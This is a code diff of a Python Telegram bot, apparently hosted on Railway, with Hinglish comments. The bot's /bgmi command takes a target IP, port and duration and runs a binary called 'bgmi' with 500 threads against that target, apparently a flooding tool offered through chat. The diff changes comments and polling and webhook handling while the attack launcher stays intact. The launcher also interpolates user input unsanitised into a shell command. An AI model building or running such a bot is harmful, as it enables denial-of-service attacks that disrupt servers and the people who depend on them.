@@ -6,7 +6,7 @@ import datetime
 import os
 import time
 
-# Railway setup: keep_alive handles the port binding
+# Railway setup: keep_alive handles the port binding for web services
 try:
     from keep_alive import keep_alive
     keep_alive()
@@ -60,24 +60,19 @@ def handle_bgmi(message):
         if len(cmd) == 4:
             target, port, duration = cmd[1], cmd[2], cmd[3]
             
-            # 1. Attack Start Message
             bot.send_message(message.chat.id, f"🚀 ATTACK STARTED!\n\n🎯 Target: {target}\n🔗 Port: {port}\n⏳ Time: {duration}s\n\nBhai, thoda wait karo...")
 
             try:
-                # 2. Give Permission (Railway requirement)
+                # Give binary execution permission
                 os.system("chmod +x bgmi")
                 
-                # 3. Execute with Error Capture
-                # Humne threads ko 500 set kiya hai
+                # Execute attack binary
                 full_command = f"./bgmi {target} {port} {duration} 500"
-                
-                # subprocess.run use kar rahe hain taaki execution confirm ho
                 result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
                 
                 if result.returncode == 0:
                     bot.send_message(message.chat.id, f"✅ ATTACK FINISHED SUCCESSFULLY!\n🎯 Target: {target}")
                 else:
-                    # Agar binary crash hui toh admin ko error milega
                     bot.send_message(message.chat.id, f"⚠️ Attack finished with code {result.returncode}.\nError: {result.stderr[:100]}")
             
             except Exception as e:
@@ -95,13 +90,23 @@ def start(message):
 def help_cmd(message):
     bot.send_message(message.chat.id, "💥 /bgmi <ip> <port> <time>\n👤 /myinfo")
 
-# --- Polling Logic ---
+# --- Polling Logic with Conflict Fix ---
 if __name__ == "__main__":
-    print("Bot is Starting on Railway...")
+    print("Fixing conflicts and starting bot...")
+    
+    # 1. Remove any existing webhooks that might cause 409 Conflict
+    try:
+        bot.remove_webhook()
+        time.sleep(1)
+    except:
+        pass
+
     while True:
         try:
-            # skip_pending=True helps avoid "message not found" errors on restart
-            bot.polling(none_stop=True, skip_pending=True, timeout=60)
+            # 2. Start polling
+            # skip_pending=True purane messages ko process nahi karega jo crash ke time aaye the
+            bot.polling(none_stop=True, skip_pending=True, interval=2, timeout=60)
         except Exception as e:
+            # Agar conflict hota hai toh thoda wait karke dobara try karega
             print(f"Polling Error: {e}")
-            time.sleep(5)
+            time.sleep(10)
